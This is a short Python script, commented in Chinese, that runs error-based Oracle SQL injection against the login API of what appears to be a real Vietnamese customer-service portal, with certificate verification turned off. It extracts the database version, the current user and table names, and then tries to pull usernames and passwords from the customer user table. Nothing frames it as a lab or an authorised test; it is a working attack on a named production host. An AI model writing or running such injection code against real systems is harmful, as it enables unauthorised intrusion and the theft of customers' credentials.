#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings()

url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

# 已知的error-based SQL注入payload模板
def inject_query(sql):
    payload = f"'||(SELECT CHR(77)||CHR(90)||CHR(78)||CHR(103) FROM DUAL WHERE 1691=1691 AND 1325=CTXSYS.DRITHSX.SN(1325,({sql})))||'"
    data = {"Username": payload, "Password": "test"}
    headers = {"Content-Type": "application/json"}
    
    resp = requests.post(url, json=data, headers=headers, verify=False, timeout=10)
    return resp.text

# 提取数据库版本
print("[*] 提取 Oracle 版本...")
result = inject_query("SELECT BANNER FROM V$VERSION WHERE ROWNUM=1")
print(result[:500])

# 提取当前用户
print("\n[*] 提取当前用户...")
result = inject_query("SELECT USER FROM DUAL")
print(result[:500])

# 提取表名
print("\n[*] 提取表名...")
result = inject_query("SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1")
print(result[:500])

# 提取USER_CUSTOMER表的数据
print("\n[*] 尝试提取用户数据...")
queries = [
    "SELECT USERNAME FROM USER_CUSTOMER WHERE ROWNUM=1",
    "SELECT PASSWORD FROM USER_CUSTOMER WHERE ROWNUM=1",
    "SELECT * FROM (SELECT USERNAME FROM USER_CUSTOMER WHERE ROWNUM<=1)",
]

for q in queries:
    print(f"\nQuery: {q}")
    result = inject_query(q)
    print(result[:500])
